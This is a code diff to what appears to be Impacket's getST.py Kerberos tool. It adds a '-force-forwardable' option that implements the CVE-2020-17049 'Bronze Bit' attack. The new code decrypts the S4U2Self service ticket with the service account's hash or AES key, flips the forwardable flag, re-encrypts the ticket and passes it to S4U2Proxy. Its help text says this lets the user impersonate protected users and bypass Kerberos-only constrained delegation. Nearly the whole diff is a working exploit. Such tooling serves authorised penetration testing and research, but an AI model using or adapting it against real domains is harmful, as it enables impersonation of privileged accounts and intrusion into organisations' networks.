@@ -52,9 +52,10 @@ from impacket import version
 from impacket.examples import logger
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
-    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS
+    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
 from impacket.krb5.ccache import CCache
-from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5
+from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, Enctype
+from impacket.krb5.constants import TicketFlags, encodeFlags
 from impacket.krb5.kerberosv5 import getKerberosTGS
 from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
 from impacket.krb5.types import Principal, KerberosTime, Ticket
@@ -71,6 +72,7 @@ class GETST:
         self.__aesKey = options.aesKey
         self.__options = options
         self.__kdcHost = options.dc_ip
+        self.__force_forwardable = options.force_forwardable
         self.__saveFileName = None
         if options.hashes is not None:
             self.__lmhash, self.__nthash = options.hashes.split(':')
@@ -82,9 +84,8 @@ class GETST:
         ccache.fromTGS(ticket, sessionKey, sessionKey)
         ccache.saveFile(self.__saveFileName + '.ccache')
 
-    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, kdcHost):
+    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
         decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]
-
         # Extract the ticket from the TGT
         ticket = Ticket()
         ticket.from_asn1(decodedTGT['ticket'])
@@ -215,16 +216,77 @@ class GETST:
             logging.debug('TGS_REP')
             print(tgs.prettyPrint())
 
+        if self.__force_forwardable:
+            # Convert hashes to binary form, just in case we're receiving strings
+            if isinstance(nthash, str):
+                try:
+                    nthash = unhexlify(nthash)
+                except TypeError:
+                    pass
+            if isinstance(aesKey, str):
+                try:
+                    aesKey = unhexlify(aesKey)
+                except TypeError:
+                    pass         
+            
+            # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
+            cipherText = tgs['ticket']['enc-part']['cipher']
+            
+            # Check which cipher was used to encrypt the ticket. It's not always the same
+            # This determines which of our keys we should use for decryption/re-encryption
+            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
+            if newCipher.enctype == Enctype.RC4:
+                key = Key(newCipher.enctype, nthash)
+            else:
+                key = Key(newCipher.enctype, aesKey)
+
+            # Decrypt and decode the ticket
+            # Key Usage 2
+            # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
+            #  application session key), encrypted with the service key
+            #  (section 5.4.2)
+            plainText = newCipher.decrypt(key, 2, cipherText)
+            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+            
+            # Print the flags in the ticket before modification
+            logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
+            logging.debug('\tService ticket from S4U2self is'
+                + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value]==1) else ' not')
+                + ' forwardable')       
+        
+            #Customize flags the forwardable flag is the only one that really matters
+            logging.info('\tForcing the service ticket to be forwardable')
+            #convert to string of bits
+            flagBits = encTicketPart['flags'].asBinary() 
+            #Set the forwardable flag. Awkward binary string insertion
+            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value+1:]
+            #Overwrite the value with the new bits
+            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)#Update flags
+            
+            logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
+            logging.debug('\tService ticket now is'
+                + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value]==1) else ' not')
+                + ' forwardable')
+            
+            # Re-encode and re-encrypt the ticket
+            # Again, Key Usage 2
+            encodedEncTicketPart = encoder.encode(encTicketPart)
+            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)
+            
+            #put it back in the TGS
+            tgs['ticket']['enc-part']['cipher'] = cipherText
+
         ################################################################################
         # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
         # So here I have a ST for me.. I now want a ST for another service
         # Extract the ticket from the TGT
         ticketTGT = Ticket()
         ticketTGT.from_asn1(decodedTGT['ticket'])
-
+        
+        #Get the service ticket
         ticket = Ticket()
         ticket.from_asn1(tgs['ticket'])
-
+        
         apReq = AP_REQ()
         apReq['pvno'] = 5
         apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
@@ -370,7 +432,8 @@ class GETST:
             # Here's the rock'n'roll
             try:
                 logging.info('Impersonating %s' % self.__options.impersonate)
-                tgs, copher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, self.__kdcHost)
+                #Editing below to pass hashes for decryption
+                tgs, copher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost) 
             except Exception as e:
                 logging.debug("Exception", exc_info=True)
                 logging.error(str(e))
@@ -398,6 +461,10 @@ if __name__ == '__main__':
                                                               'delegation to the SPN specified')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-force-forwardable', action='store_true', help='Force the service ticket obtained through '
+                        'S4U2Self to be forwardable. For best results, the -hashes and -aesKey values for the '
+                        'specified -identity should be provided. This allows impresonation of protected users '
+                        'and bypass of "Kerberos-only" constrained delegation restrictions. See CVE-2020-17049')
 
     group = parser.add_argument_group('authentication')
 
@@ -410,6 +477,7 @@ if __name__ == '__main__':
                                                                             '(128 or 256 bits)')
     group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                        'ommited it use the domain part (FQDN) specified in the target parameter')
+    
 
     if len(sys.argv)==1:
         parser.print_help()
